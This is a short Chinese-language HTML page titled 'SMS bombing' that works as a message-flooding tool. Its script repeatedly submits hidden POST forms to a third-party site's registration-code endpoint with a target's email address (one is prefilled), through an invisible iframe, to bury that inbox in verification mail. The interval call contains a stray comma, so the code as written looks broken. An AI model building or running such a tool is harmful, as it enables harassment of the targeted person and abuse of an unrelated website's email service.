<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>短信轰炸</title>
<style>
    body { background: #008000; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .container { text-align: center; }
    .title { color: white; font-size: 48px; font-weight: bold; background: #006400; padding: 20px 80px; border-radius: 100px; margin-bottom: 30px; }
    input { padding: 15px; font-size: 18px; width: 300px; margin-bottom: 20px; border: none; border-radius: 5px; }
    button { padding: 15px 50px; font-size: 20px; background: #004d00; color: white; border: none; border-radius: 5px; cursor: pointer; }
    #counter { color: white; font-size: 24px; margin-top: 20px; }
</style>
</head>
<body>
    <div class="container">
        <div class="title">短信轰炸</div>
        <br>
        <input type="text" id="emailInput" placeholder="请输入邮箱" value="91@oemails.com">
        <br>
        <button id="btn" onclick="toggle()">发送</button>
        <div id="counter">执行次数: 0</div>
    </div>

    <iframe name="iframe" style="display:none;"></iframe>

    <script>
        let timer = null;
        let count = 0;

        function toggle() {
            if(timer) {
                clearInterval(timer);
                timer = null;
                document.getElementById('btn').innerText = '发送';
            } else {
                count = 0;
                timer = setInterval(function() {
                    count++;
                    document.getElementById('counter').innerText = '执行次数: ' + count;

                    let email = document.getElementById('emailInput').value;
                    let form = document.createElement('form');
                    form.method = 'POST';
                    form.action = 'https://www.lh6bx.xyz/index/user/getregcode.html';
                    form.target = 'iframe';

                    let input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = 'useremail';
                    input.value = email;

                    form.appendChild(input);
                    document.body.appendChild(form);
                    form.submit();
                    document.body.removeChild(form);

                }, ,5000);
                document.getElementById('btn').innerText = '取消发送';
            }
        }
    </script>
</body>
</html>
